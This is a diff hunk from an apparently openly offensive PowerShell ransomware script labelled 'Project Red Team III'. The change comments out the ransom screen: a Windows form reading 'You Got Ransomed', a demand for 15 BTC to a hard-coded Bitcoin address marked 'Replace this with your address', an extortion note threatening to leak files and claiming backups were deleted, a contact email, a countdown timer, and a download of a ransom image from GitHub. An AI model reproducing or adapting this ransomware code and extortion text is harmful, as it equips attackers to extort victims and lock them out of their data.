@@ -306,108 +306,108 @@ $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::Fro
 
 # Start-Sleep -s 10
 #remove-variable pwd
-Write-Host "[+] Intiating ransom UI..." -ForegroundColor Green
-[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
-[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
-[void] [System.Windows.Forms.Application]::EnableVisualStyles() 
+# Write-Host "[+] Intiating ransom UI..." -ForegroundColor Green
+# [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
+# [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
+# [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
 
-function RandomBacklight {
-$random = New-Object System.Random 
-switch ($random.Next(9)) { 
-    0 {$Form.BackColor = "LightBlue"} 
-    1 {$Form.BackColor = "LightGreen"} 
-    2 {$Form.BackColor = "LightPink"} 
-    3 {$Form.BackColor = "Yellow"} 
-    4 {$Form.BackColor = "Orange"} 
-    5 {$Form.BackColor = "Brown"} 
-    6 {$Form.BackColor = "Magenta"} 
-    7 {$Form.BackColor = "White"} 
-    8 {$Form.BackColor = "Gray"} 
-} 
-}
+# function RandomBacklight {
+# $random = New-Object System.Random 
+# switch ($random.Next(9)) { 
+#     0 {$Form.BackColor = "LightBlue"} 
+#     1 {$Form.BackColor = "LightGreen"} 
+#     2 {$Form.BackColor = "LightPink"} 
+#     3 {$Form.BackColor = "Yellow"} 
+#     4 {$Form.BackColor = "Orange"} 
+#     5 {$Form.BackColor = "Brown"} 
+#     6 {$Form.BackColor = "Magenta"} 
+#     7 {$Form.BackColor = "White"} 
+#     8 {$Form.BackColor = "Gray"} 
+# } 
+# }
 
-$Form = New-Object system.Windows.Forms.Form 
-$Form.Size = New-Object System.Drawing.Size(960,900) 
-#You can use the below method as well 
-#$Form.Width = 400 
-#$Form.Height = 200 
-$Form.Add_Click({RandomBacklight}) 
-$form.MaximizeBox = $false 
-$Form.Back
-$Form.StartPosition = "CenterScreen" 
-$Form.FormBorderStyle = 'Fixed3D' 
-$Form.Text = "Project Red Team III" 
+# $Form = New-Object system.Windows.Forms.Form 
+# $Form.Size = New-Object System.Drawing.Size(960,900) 
+# #You can use the below method as well 
+# #$Form.Width = 400 
+# #$Form.Height = 200 
+# $Form.Add_Click({RandomBacklight}) 
+# $form.MaximizeBox = $false 
+# $Form.Back
+# $Form.StartPosition = "CenterScreen" 
+# $Form.FormBorderStyle = 'Fixed3D' 
+# $Form.Text = "Project Red Team III" 
 
-$img = [System.Drawing.Image]::Fromfile('c:\temp\ransom.jpg')
-$pictureBox = new-object Windows.Forms.PictureBox
-$pictureBox.Width = $img.Size.Width
-$pictureBox.Height = $img.Size.Height
-$pictureBox.Image = $img
-$form.controls.add($pictureBox)
+# $img = [System.Drawing.Image]::Fromfile('c:\temp\ransom.jpg')
+# $pictureBox = new-object Windows.Forms.PictureBox
+# $pictureBox.Width = $img.Size.Width
+# $pictureBox.Height = $img.Size.Height
+# $pictureBox.Image = $img
+# $form.controls.add($pictureBox)
 
-$Label = New-Object System.Windows.Forms.Label
-$Label.ForeColor = "Green"
-$Label.Text = "--You Got Ransomed-- !!! ++ DO NOT TURN-OFF YOUR COMPUTER ++ !!! " 
-$Label.AutoSize = $true 
-$Label.Location = New-Object System.Drawing.Size(50,450) 
-$Font = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
-$form.Font = $Font 
-$Form.Controls.Add($Label) 
+# $Label = New-Object System.Windows.Forms.Label
+# $Label.ForeColor = "Green"
+# $Label.Text = "--You Got Ransomed-- !!! ++ DO NOT TURN-OFF YOUR COMPUTER ++ !!! " 
+# $Label.AutoSize = $true 
+# $Label.Location = New-Object System.Drawing.Size(50,450) 
+# $Font = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
+# $form.Font = $Font 
+# $Form.Controls.Add($Label) 
  
-#$formIcon = New-Object system.drawing.icon ("$env:USERPROFILE\desktop\Blog\v.ico") 
-#$form.Icon = $formicon 
+# #$formIcon = New-Object system.drawing.icon ("$env:USERPROFILE\desktop\Blog\v.ico") 
+# #$form.Icon = $formicon 
  
-$Okbutton = New-Object System.Windows.Forms.Button 
-$Okbutton.Location = New-Object System.Drawing.Size(50,500) 
-$Okbutton.Size = New-Object System.Drawing.Size(450,30) 
-$Okbutton.Text = "View Encrypted Files with Phiarutee" 
-$Okbutton.Add_Click({EncryptedFiles}) 
-$Form.Controls.Add($Okbutton) 
+# $Okbutton = New-Object System.Windows.Forms.Button 
+# $Okbutton.Location = New-Object System.Drawing.Size(50,500) 
+# $Okbutton.Size = New-Object System.Drawing.Size(450,30) 
+# $Okbutton.Text = "View Encrypted Files with Phiarutee" 
+# $Okbutton.Add_Click({EncryptedFiles}) 
+# $Form.Controls.Add($Okbutton) 
 
-$btc_addr = '1HF16jtnSCuRvAThJ7p99QeroAnBkiR4Yb'      # Replace this with your address
-$Label1 = New-Object System.Windows.Forms.Label 
-$Label1.Text = "Send 15 BTC to this account: $btc_addr" 
-$Label1.AutoSize = $true 
-$Label1.Location = New-Object System.Drawing.Size(50,550) 
-$Font1 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
-$form.Font = $Font1
-$Form.Controls.Add($Label1) 
+# $btc_addr = '1HF16jtnSCuRvAThJ7p99QeroAnBkiR4Yb'      # Replace this with your address
+# $Label1 = New-Object System.Windows.Forms.Label 
+# $Label1.Text = "Send 15 BTC to this account: $btc_addr" 
+# $Label1.AutoSize = $true 
+# $Label1.Location = New-Object System.Drawing.Size(50,550) 
+# $Font1 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
+# $form.Font = $Font1
+# $Form.Controls.Add($Label1) 
 
-$objTextBox1 = New-Object System.Windows.Forms.TextBox 
-$objTextBox1.Multiline = $True;
-$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read ransom.txt file on the desktop for further information."
-$objTextBox1.AutoSize = $true 
-$objTextBox1.Location = New-Object System.Drawing.Size(50,650)
-$objTextBox1.Size = New-Object System.Drawing.Size(850,180)
-$Font2 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
-$objTextBox1.Scrollbars = "Vertical" 
-$form.Font = $Font2
-$Form.Controls.Add($objTextBox1) 
+# $objTextBox1 = New-Object System.Windows.Forms.TextBox 
+# $objTextBox1.Multiline = $True;
+# $objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read ransom.txt file on the desktop for further information."
+# $objTextBox1.AutoSize = $true 
+# $objTextBox1.Location = New-Object System.Drawing.Size(50,650)
+# $objTextBox1.Size = New-Object System.Drawing.Size(850,180)
+# $Font2 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
+# $objTextBox1.Scrollbars = "Vertical" 
+# $form.Font = $Font2
+# $Form.Controls.Add($objTextBox1) 
 
-$delay = 5
+# $delay = 5
 
-$Counter_Label = New-Object System.Windows.Forms.Label
-$Counter_Label.Location = New-Object System.Drawing.Size(50,600) 
-$Counter_Label.AutoSize = $true 
-$Counter_Label.ForeColor = "Green"
-$Form.Controls.Add($Counter_Label)
+# $Counter_Label = New-Object System.Windows.Forms.Label
+# $Counter_Label.Location = New-Object System.Drawing.Size(50,600) 
+# $Counter_Label.AutoSize = $true 
+# $Counter_Label.ForeColor = "Green"
+# $Form.Controls.Add($Counter_Label)
 
-while ($delay -ge 0)
-{
-	$Form.Show()
-    $Counter_Label.Text = "Seconds Remaining: $($delay)"
-	if ($delay -lt 5)
-	  { 
-		 $Counter_Label.ForeColor = "Green"
-		 $fontsize = 20-$delay
-		 $warningfont = New-Object System.Drawing.Font("Times New Roman",$fontsize,[System.Drawing.FontStyle]([System.Drawing.FontStyle]::Bold))
-		 $Counter_Label.Font = $warningfont
-	  }
-Start-Sleep 1
-$delay -= 1	  
-}
-$Form.Close()
-$background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
+# while ($delay -ge 0)
+# {
+# 	$Form.Show()
+#     $Counter_Label.Text = "Seconds Remaining: $($delay)"
+# 	if ($delay -lt 5)
+# 	  { 
+# 		 $Counter_Label.ForeColor = "Green"
+# 		 $fontsize = 20-$delay
+# 		 $warningfont = New-Object System.Drawing.Font("Times New Roman",$fontsize,[System.Drawing.FontStyle]([System.Drawing.FontStyle]::Bold))
+# 		 $Counter_Label.Font = $warningfont
+# 	  }
+# Start-Sleep 1
+# $delay -= 1	  
+# }
+# $Form.Close()
+# $background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
 # Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/ransom.jpg" | Out-Null
 # Start-Sleep -s 2
 <#
